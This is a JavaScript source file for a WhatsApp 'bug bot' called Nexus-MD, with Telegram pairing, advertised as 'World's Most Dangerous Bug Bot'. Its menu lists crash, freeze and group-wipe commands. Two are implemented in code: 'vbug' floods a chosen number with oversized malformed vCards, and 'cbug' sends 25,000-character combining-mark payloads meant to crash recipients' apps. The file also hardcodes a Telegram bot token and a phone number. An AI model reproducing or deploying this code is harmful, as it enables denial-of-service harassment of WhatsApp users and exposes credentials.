const { 
    default: makeWASocket, 
    useMultiFileAuthState, 
    DisconnectReason, 
    getContentType,
    fetchLatestBaileysVersion
} = require("@whiskeysockets/baileys");
const TelegramBot = require('node-telegram-bot-api');
const pino = require("pino");
const fs = require("fs");

// --- [ CONFIGURATION ] ---
const tgToken = '8628876949:AAGE8DNJIpOaaD3akR4MRaLfNjd3aN-tP_4';
const ownerNumber = "94770475809";
const prefix = ".";

const tgBot = new TelegramBot(tgToken, { polling: true });

async function startNexus() {
    const { state, saveCreds } = await useMultiFileAuthState('session');
    const { version } = await fetchLatestBaileysVersion();

    const sock = makeWASocket({
        version,
        auth: state,
        printQRInTerminal: false,
        logger: pino({ level: "silent" }),
        browser: ["Nexus-V5", "Chrome", "20.0.04"]
    });

    sock.ev.on('creds.update', saveCreds);

    // --- [ 🛠️ TELEGRAM ONLY PAIRING LOGIC ] ---
    tgBot.onText(/\/start/, (msg) => {
        const welcome = `👋 *Welcome to Nexus-MD Hybrid System!*\n\n` +
                        `WhatsApp Pairing Code එකක් ගන්න පහත විදිහට ටයිප් කරන්න:\n\n` +
                        `👉 \`/pair 947xxxxxxxx\` \n\n` +
                        `🚀 *Created by Sasiya MD*`;
        tgBot.sendMessage(msg.chat.id, welcome, { parse_mode: "Markdown" });
    });

    tgBot.onText(/\/pair (.+)/, async (msg, match) => {
        const chatId = msg.chat.id;
        let targetNum = match[1].replace(/[^0-9]/g, '');

        if (!targetNum || targetNum.length < 10) {
            return tgBot.sendMessage(chatId, "❌ නම්බර් එක වැරදියි මචං!");
        }

        tgBot.sendMessage(chatId, `⏳ *${targetNum}* සඳහා කෝඩ් එක හදනවා...`);

        try {
            const tempDir = `temp_${targetNum}`;
            const { state: tState } = await useMultiFileAuthState(tempDir);
            const tSock = makeWASocket({ auth: tState, logger: pino({ level: "silent" }), browser: ["Nexus-V5", "Safari", "1.0"] });

            setTimeout(async () => {
                try {
                    let code = await tSock.requestPairingCode(targetNum);
                    code = code?.match(/.{1,4}/g)?.join("-") || code;
                    await tgBot.sendMessage(chatId, `🔥 *YOUR CODE:* \`${code}\``, { parse_mode: "Markdown" });
                    setTimeout(() => { if (fs.existsSync(tempDir)) fs.rmSync(tempDir, { recursive: true, force: true }); }, 15000);
                } catch (err) {
                    tgBot.sendMessage(chatId, "❌ වැරදීමක් වුණා. පසුව උත්සාහ කරන්න.");
                }
            }, 6000);
        } catch (e) { console.log(e); }
    });

    // --- [ 💀 WHATSAPP BUG SYSTEM & GRAND MENU ] ---
    sock.ev.on('messages.upsert', async (chat) => {
        const msg = chat.messages[0];
        if (!msg.message || msg.key.fromMe) return;
        const from = msg.key.remoteJid;
        const type = getContentType(msg.message);
        const body = (type === 'conversation') ? msg.message.conversation : (type === 'extendedTextMessage') ? msg.message.extendedTextMessage.text : '';
        
        if (!body.startsWith(prefix)) return;
        const command = body.slice(prefix.length).trim().split(' ')[0].toLowerCase();
        const args = body.trim().split(/ +/).slice(1);

        // --- THE GRAND MENU ---
        if (command === 'menu') {
            const menu = `
⚡ *NEXUS-MD V5.0 ULTIMATE BUG MENU* ⚡

👋 *Hello Sasiya MD!*
🛡️ *Status:* Hybrid Online ✅

*─── [ 💀 BUG ATTACKS ] ───*
◈ ${prefix}vbug - Vcard Mega Crash ⚰️
◈ ${prefix}cbug - Char Overflow Bug
◈ ${prefix}lbug - Location Freeze
◈ ${prefix}abug - Audio Buffer Bug
◈ ${prefix}pbug - Poll Unlimited
◈ ${prefix}tagbug - Contact Tag Crash
◈ ${prefix}crash - System Total Freeze

*─── [ 👾 GROUP EXPLOITS ] ───*
◈ ${prefix}kickall - Group Wipe
◈ ${prefix}hidetag - Ghost Tag All

*─── [ 🛠️ TOOLS ] ───*
◈ ${prefix}ping - Speed Test
◈ ${prefix}owner - Sasiya MD Info
◈ ${prefix}reboot - Restart

🚀 *Powered by Developer Nexus*
🛡️ *Pairing ONLY on Telegram Bot*
            `;

            await sock.sendMessage(from, { 
                text: menu,
                contextInfo: {
                    externalAdReply: {
                        title: "NEXUS BUG SYSTEM ONLINE",
                        body: "World's Most Dangerous Bug Bot",
                        thumbnailUrl: "https://files.catbox.moe/6v0m3q.jpg",
                        mediaType: 1,
                        renderLargerThumbnail: true
                    }
                }
            });
        }

        // --- BUG LOGIC: VCARD CRASH ---
        if (command === 'vbug') {
            let target = args[0] ? args[0].replace(/[^0-9]/g, '') + "@s.whatsapp.net" : from;
            const vcard = 'BEGIN:VCARD\n' + 'VERSION:3.0\n' + 'FN:NEXUS CRASH ⚰️\n' + 'TEL;waid=94770475809:+94770475809\n' + 'END:VCARD'.repeat(350);
            await sock.sendMessage(from, { text: "💀 Vcard Crash Attack Started..." });
            for (let i = 0; i < 10; i++) {
                await sock.sendMessage(target, { contacts: { displayName: 'NEXUS CRASH', contacts: [{ vcard }] } });
            }
            sock.sendMessage(from, { text: "✅ Done!" });
        }

        // --- BUG LOGIC: CHAR OVERFLOW ---
        if (command === 'cbug') {
            let target = args[0] ? args[0].replace(/[^0-9]/g, '') + "@s.whatsapp.net" : from;
            const payload = "҈".repeat(25000) + "⚰️".repeat(5000);
            for (let i = 0; i < 5; i++) {
                await sock.sendMessage(target, { text: payload });
            }
            sock.sendMessage(from, { text: "✅ Character Bug Sent!" });
        }
    });

    sock.ev.on('connection.update', (update) => {
        const { connection } = update;
        if (connection === 'open') console.log('✅ Nexus Hybrid System Online!');
        if (connection === 'close') startNexus();
    });
}

startNexus();
